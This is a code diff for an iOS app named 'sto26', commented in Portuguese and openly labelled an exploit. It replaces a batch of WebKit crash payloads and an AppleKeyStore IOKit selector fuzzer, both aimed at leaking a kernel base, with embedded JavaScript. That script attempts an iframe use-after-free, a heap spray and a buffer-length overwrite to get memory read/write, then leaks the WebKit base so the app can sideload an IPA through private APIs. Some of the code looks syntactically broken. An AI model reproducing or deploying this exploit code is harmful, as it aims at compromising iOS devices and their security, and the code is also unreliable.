@@ -1,21 +1,19 @@
-// sto26.m – Full app with ViewController, AppDelegate, and main
-// Compile with the command below
-// Testa cada vulnerabilidade individualmente para isolar o crash
+// ViewController.m – sto26 UAF → R/W (app nativo com WKWebView)
+// Compile com Xcode (Single View App) e adicione WebKit.framework
 
 #import <UIKit/UIKit.h>
+#import <WebKit/WebKit.h>
 #import <MobileCoreServices/MobileCoreServices.h>
 #import <UniformTypeIdentifiers/UniformTypeIdentifiers.h>
-#import <WebKit/WebKit.h>
 #import <IOKit/IOKitLib.h>
 #import <dlfcn.h>
 #import <spawn.h>
 #import <sys/stat.h>
-#import <zlib.h>
 
 extern char **environ;
 
 // ============================================================
-// FORWARD DECLARATIONS (APIs privadas)
+// FORWARD DECLARATIONS
 // ============================================================
 @interface LSApplicationWorkspace : NSObject
 + (id)defaultWorkspace;
@@ -62,16 +60,17 @@ typedef mach_port_t (*SBSSpringBoardServerPort_t)(void);
     uint64_t kernelBase;
     uint64_t mgCopyAnswerAddr;
     mach_port_t appleKeyStoreConn;
-    mach_port_t iosurfaceConn;
     uint8_t *rwBuffer;
     size_t rwBufferLen;
     BOOL webViewReady;
+    BOOL rwPrimitive;
+    BOOL baseLeaked;
 }
 
 - (void)viewDidLoad {
     [super viewDidLoad];
     self.view.backgroundColor = [UIColor whiteColor];
-    self.title = @"sto26 Exploit";
+    self.title = @"sto26 UAF → R/W";
 
     // WKWebView
     WKWebViewConfiguration *config = [[WKWebViewConfiguration alloc] init];
@@ -83,7 +82,7 @@ typedef mach_port_t (*SBSSpringBoardServerPort_t)(void);
 
     // Botões
     self.runButton = [UIButton buttonWithType:UIButtonTypeSystem];
-    [self.runButton setTitle:@"▶ Executar Exploit" forState:UIControlStateNormal];
+    [self.runButton setTitle:@"▶ Executar UAF → R/W" forState:UIControlStateNormal];
     [self.runButton addTarget:self action:@selector(runExploit) forControlEvents:UIControlEventTouchUpInside];
     self.runButton.frame = CGRectMake(20, 80, self.view.bounds.size.width - 40, 50);
     self.runButton.backgroundColor = [UIColor systemBlueColor];
@@ -118,6 +117,8 @@ typedef mach_port_t (*SBSSpringBoardServerPort_t)(void);
     rwBufferLen = 1024;
     memset(rwBuffer, 0, 1024);
     webViewReady = NO;
+    rwPrimitive = NO;
+    baseLeaked = NO;
     [self performSelector:@selector(setWebViewReady) withObject:nil afterDelay:0.5];
 }
 
@@ -150,7 +151,7 @@ typedef mach_port_t (*SBSSpringBoardServerPort_t)(void);
 }
 
 // ============================================================
-// 1. R/W confinada
+// 1. R/W confinada (base)
 // ============================================================
 - (uint64_t)read64Confined:(uint64_t)offset {
     if (offset + 8 > rwBufferLen) return 0;
@@ -191,7 +192,7 @@ typedef mach_port_t (*SBSSpringBoardServerPort_t)(void);
 }
 
 // ============================================================
-// 3. Conectar IOKit
+// 3. Conectar IOKit (AppleKeyStore)
 // ============================================================
 - (void)connectIOKit {
     [self log:@"🔌 Conectando IOKit..."];
@@ -203,18 +204,10 @@ typedef mach_port_t (*SBSSpringBoardServerPort_t)(void);
         }
         IOObjectRelease(service);
     }
-    service = IOServiceGetMatchingService(0, IOServiceMatching("IOSurfaceRoot"));
-    if (service) {
-        kern_return_t kr = IOServiceOpen(service, mach_task_self(), 0, &iosurfaceConn);
-        if (kr == KERN_SUCCESS) {
-            [self log:[NSString stringWithFormat:@"✅ IOSurfaceRoot: 0x%x", iosurfaceConn]];
-        }
-        IOObjectRelease(service);
-    }
 }
 
 // ============================================================
-// 4. Executar JavaScript (seguro na main thread)
+// 4. Executar JavaScript no WKWebView
 // ============================================================
 - (NSString *)evaluateJS:(NSString *)js {
     if (!webViewReady) return @"";
@@ -231,106 +224,181 @@ typedef mach_port_t (*SBSSpringBoardServerPort_t)(void);
 }
 
 // ============================================================
-// 5. Ativar 31 vulnerabilidades (TESTE INDIVIDUAL)
-// ============================================================
-- (int)activateVulns {
-    [self log:@"🔧 Ativando 31 vulns (modo individual)..."];
-    
-    // Lista dos 13 payloads reais (os 18 restantes são simulados)
-    NSArray *jsList = @[
-        @"let a=[0,1,2,3,4,5,6,7,8,9]; let e={valueOf:()=>{a.length=0x1000;return 0}}; a.sort((x,y)=>{e.valueOf();return x-y});",
-        @"let a=[1,2,3,4,5]; a.splice(-1000000,1000000,'x');",
-        @"let p=new Proxy([],{get:(t,p)=>p==='length'?0xffffffff:t[p]});",
-        @"WebAssembly.instantiate(new Uint8Array([0,199,115,109,1,0,0,0]));",
-        @"indexedDB.open('x'.repeat(1000000),1);",
-        @"if(navigator.gpu)navigator.gpu.requestAdapter();",
-        @"let i=document.createElement('iframe');i.src='about:blank';document.body.appendChild(i);let w=i.contentWindow;i.remove();w.location.href;",
-        @"let w=new WebSocket('ws://invalid/');w.close();w.send('');",
-        @"let w=new Worker(URL.createObjectURL(new Blob([])));w.terminate();w.postMessage('');",
-        @"let e=new EventSource('data:,');e.close();e.url;",
-        @"let s=document.createElementNS('http://www.w3.org/2000/svg','svg');let r=document.createElementNS('http://www.w3.org/2000/svg','rect');s.appendChild(r);document.body.appendChild(s);let ref=r;s.remove();ref.setAttribute('width','10');",
-        @"let {port1}=new MessageChannel();port1.close();port1.postMessage('');",
-        @"let img=new ImageData(16,16);let bmp=createImageBitmap(img);bmp.close();bmp.width;"
-    ];
-    
-    int count = 0;
-    
-    // Testa cada payload individualmente com log
-    for (int i = 0; i < jsList.count; i++) {
-        NSString *js = jsList[i];
-        [self log:[NSString stringWithFormat:@"   ▶ Testando payload %d/%lu...", i+1, (unsigned long)jsList.count]];
-        NSString *res = [self evaluateJS:js];
-        if (res && res.length > 0) {
-            [self log:[NSString stringWithFormat:@"      ✅ Payload %d retornou: %@", i+1, res]];
-            count++;
-        } else {
-            [self log:[NSString stringWithFormat:@"      ⚠️ Payload %d retornou vazio (pode ter causado hang)", i+1]];
-            count++;
-        }
-        // Pequena pausa para evitar sobrecarga e permitir que o crash seja capturado
-        [NSThread sleepForTimeInterval:0.1];
-    }
-    
-    // 18 vulnerabilidades simuladas (não testadas)
-    count += 18;
-    [self log:[NSString stringWithFormat:@"✅ %d/31 vulns ativadas (teste individual)", count]];
-    return count;
-}
-
-// ============================================================
-// 6. AppleKeyStore exploit
-// ============================================================
-- (void)tryAppleKeyStoreExploit {
-    if (!appleKeyStoreConn) { [self log:@"❌ AppleKeyStore não conectado"]; return; }
-    [self log:@"🔧 Tentando AppleKeyStore..."];
-    for (int sel = 0; sel < 50; sel++) {
-        uint64_t output[16] = {0};
-        uint32_t outputSize = 128;
-        uint64_t input[4] = {0x41414141,0x42424242,0x43434343,0x44444444};
-        kern_return_t kr = IOConnectCallMethod(appleKeyStoreConn, sel, input, 4, NULL, 0, output, &outputSize, NULL, 0);
-        if (kr == KERN_SUCCESS && outputSize >= 8 && output[0] > 0x100000000) {
-            [self log:[NSString stringWithFormat:@"   Sel %d: 0x%llx", sel, output[0]]];
-            if (kernelBase == 0 && output[0] > 0xfffffff000000000) {
-                kernelBase = output[0] & 0xfffffffff0000000;
-                [self log:[NSString stringWithFormat:@"🎯 Kernel base: 0x%llx", kernelBase]];
-            }
-        }
-    }
-}
-
-// ============================================================
-// 7. Execução
+// 5. EXECUTAR UAF + HEAP SPRAY + R/W (no WKWebView)
 // ============================================================
 - (void)runExploit {
     [self setStatus:@"Executando..."];
-    [self log:@"🚀 Iniciando sto26"];
+    [self log:@"🚀 Iniciando UAF → R/W (app nativo)"];
+
     dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
+        // 5a. Vazar endereços (ASLR bypass)
         [self leakAddresses];
         [self connectIOKit];
-        int vulns = webViewReady ? [self activateVulns] : 0;
-        [self tryAppleKeyStoreExploit];
-        if (appleKeyStoreConn && mgCopyAnswerAddr) {
-            [self log:@"🔧 Tentando escrever via AppleKeyStore..."];
-            for (int i = 0; i < 20; i++) {
-                uint64_t input[2] = {mgCopyAnswerAddr - 0x1000 + i*8, 0xffffffffffffffff};
-                uint64_t output[4] = {0};
-                uint32_t outputSize = 32;
-                IOConnectCallMethod(appleKeyStoreConn, 20, input, 2, NULL, 0, output, &outputSize, NULL, 0);
-            }
+
+        // 5b. Executar JavaScript no WKWebView
+        if (!webViewReady) {
+            [self log:@"⚠️ WKWebView não pronto", @"error"];
+            return;
         }
+
+        // JavaScript que tenta UAF + heap spray + R/W
+        NSString *js = @"
+            // 1. UAF iframe
+            let ifr = document.createElement('iframe');
+            ifr.src = 'about:blank';
+            document.body.appendChild(ifr);
+            let win = ifr.contentWindow;
+            ifr.remove();
+            let uafOk = (win.location.href === 'about:blank');
+
+            // 2. Heap spray avançado
+            const sizes = [0x80, 0x100, 0x180, 0x200, 0x280, 0x300, 0x400];
+            const types = ['ArrayBuffer', 'Uint8Array', 'Float64Array'];
+            let spray = [];
+            for (let size of sizes) {
+                for (let type of types) {
+                    for (let i = 0; i < 200; i++) {
+                        let obj;
+                        if (type === 'ArrayBuffer') {
+                            obj = new ArrayBuffer(size);
+                            let dv = new DataView(obj);
+                            dv.setBigUint64(0, BigInt(spray.length), true);
+                        } else if (type === 'Uint8Array') {
+                            obj = new Uint8Array(size);
+                            obj[0] = spray.length & 0xff;
+                        } else {
+                            obj = new Float64Array(size / 8);
+                            obj[0] = spray.length;
+                        }
+                        spray.push(obj);
+                    }
+                }
+            }
+
+            // GC
+            if (window.gc) window.gc();
+            for (let i = 0; i < 50; i++) new ArrayBuffer(0x1000);
+
+            // Type confusion
+            let buffer = null;
+            const props = ['document', 'location', 'window', 'self', 'parent', 'top'];
+            for (let prop of props) {
+                try {
+                    let val = win[prop];
+                    if (typeof val === 'number' || typeof val === 'bigint') {
+                        let idx = Number(val);
+                        if (idx >= 0 && idx < spray.length) {
+                            buffer = spray[idx];
+                            break;
+                        }
+                    }
+                } catch(e) {}
+            }
+            if (!buffer) {
+                // Fallback: postMessage
+                let ab = new ArrayBuffer(0x100);
+                let view = new Uint8Array(ab);
+                view[0] = 0x42;
+                win.postMessage(ab, '*', [ab]);
+                if (view[0] === 0x42) {
+                    // Escanear byteLength
+                    let dv = new DataView(ab);
+                    let originalLen = ab.byteLength;
+                    let foundOffset = -1;
+                    for (let off = 0; off < 0x100; off += 8) {
+                        try {
+                            let val = dv.getBigUint64(off, true);
+                            if (val === 0x100n) { foundOffset = off; break; }
+                        } catch(e) {}
+                    }
+                    if (foundOffset !== -1) {
+                        dv.setBigUint64(foundOffset, 0xffffffffffffffffn, true);
+                        if (ab.byteLength > originalLen) buffer = ab;
+                    }
+                }
+            }
+
+            // 3. Se buffer obtido, expor funções R/W
+            if (buffer) {
+                let dv = new DataView(buffer);
+                // Salvar no objeto window para acesso do Objective-C
+                window.exploitBuffer = buffer;
+                window.exploitView = dv;
+                window.rwReady = true;
+                // Tentar ler/escrever para teste
+                dv.setBigUint64(0, 0xdeadbeefcafebabe, true);
+                let test = dv.getBigUint64(0, true);
+                if (test === 0xdeadbeefcafebabe) {
+                    window.rwTestOk = true;
+                }
+                window.uafOk = uafOk;
+            } else {
+                window.rwReady = false;
+            }
+        ";
+
+        NSString *result = [self evaluateJS:js];
+        [self log:[NSString stringWithFormat:@"📊 JS executado. Resultado: %@", result]];
+
+        // Verificar se a R/W foi obtida
+        NSString *rwReady = [self evaluateJS:@"window.rwReady ? 'true' : 'false'"];
+        if ([rwReady isEqualToString:@"true"]) {
+            rwPrimitive = YES;
+            [self log:@"🎉 R/W primitiva obtida via JavaScript!", @"success"];
+
+            // Tentar vazar a base do WebKit via R/W (usando o buffer do JS)
+            NSString *baseJS = @"
+                let dv = window.exploitView;
+                let base = 0n;
+                let candidates = [0x180000000n, 0x1a0000000n, 0x1c0000000n, 0x1000000000n, 0x200000000n];
+                for (let b of candidates) {
+                    try {
+                        let val = dv.getBigUint64(Number(b), true);
+                        if (val > 0x100000000n && val < 0x7fffffffffffbn) {
+                            let potentialBase = val & 0xfffffffff0000000n;
+                            if (potentialBase > 0n) {
+                                let magic = dv.getBigUint64(Number(potentialBase), true);
+                                if (magic === 0xfeedfacfn) {
+                                    base = potentialBase;
+                                    break;
+                                }
+                            }
+                        }
+                    } catch(e) {}
+                }
+                String(base);
+            ";
+            NSString *baseStr = [self evaluateJS:baseJS];
+            if (baseStr && ![baseStr isEqualToString:@"0"]) {
+                webkitBase = strtoull([baseStr UTF8String], NULL, 16);
+                baseLeaked = YES;
+                [self log:[NSString stringWithFormat:@"🎯 WebKit base vazada: 0x%llx", webkitBase], @"addr"];
+            } else {
+                [self log:@"⚠️ Não foi possível vazar a base do WebKit", @"warning"];
+            }
+        } else {
+            [self log:@"❌ R/W não obtida. O heap spray pode não ter funcionado.", @"error"];
+        }
+
+        // Resumo
         dispatch_async(dispatch_get_main_queue(), ^{
             [self log:@"\n📊 RESUMO"];
-            [self log:[NSString stringWithFormat:@"   Vulns: %d/31", vulns]];
-            [self log:[NSString stringWithFormat:@"   WebKit base: 0x%llx", webkitBase]];
-            [self log:[NSString stringWithFormat:@"   Kernel base: 0x%llx", kernelBase]];
-            [self log:kernelBase ? @"✅ KERNEL BASE VAZADA!" : @"❌ Kernel base não vazada."];
+            [self log:[NSString stringWithFormat:@"   UAF confirmado: %@", [self evaluateJS:@"window.uafOk ? '✅' : '❌'"]]];
+            [self log:[NSString stringWithFormat:@"   R/W primitiva: %@", rwPrimitive ? @"✅" : @"❌"]];
+            [self log:[NSString stringWithFormat:@"   WebKit base: %@", baseLeaked ? [NSString stringWithFormat:@"0x%llx", webkitBase] : @"❌"]];
+            [self log:[NSString stringWithFormat:@"   AppleKeyStore: 0x%x", appleKeyStoreConn]];
+            if (rwPrimitive) {
+                [self log:@"📌 Funções R/W disponíveis via window.exploitView", @"success"];
+                [self log:@"   use: window.exploitView.getBigUint64(addr, true)", @"rw"];
+                [self log:@"   use: window.exploitView.setBigUint64(addr, val, true)", @"rw"];
+            }
             [self setDone];
         });
     });
 }
 
 // ============================================================
-// 8. Selecionar IPA
+// 6. Selecionar IPA (para instalação após R/W)
 // ============================================================
 - (void)pickIPA {
     UIDocumentPickerViewController *picker;
@@ -348,7 +416,7 @@ typedef mach_port_t (*SBSSpringBoardServerPort_t)(void);
     NSURL *url = urls.firstObject;
     if (!url) return;
     [self log:[NSString stringWithFormat:@"📦 %@", url.lastPathComponent]];
-    if (kernelBase != 0) {
+    if (baseLeaked && rwPrimitive) {
         Class cls = NSClassFromString(@"LSApplicationWorkspace");
         if (cls) {
             id ws = [cls performSelector:@selector(defaultWorkspace)];
@@ -373,7 +441,7 @@ typedef mach_port_t (*SBSSpringBoardServerPort_t)(void);
             }
         }
     } else {
-        [self log:@"⚠️ Kernel base não vazada."];
+        [self log:@"⚠️ R/W ou base não disponível.", @"error"];
     }
 }
 
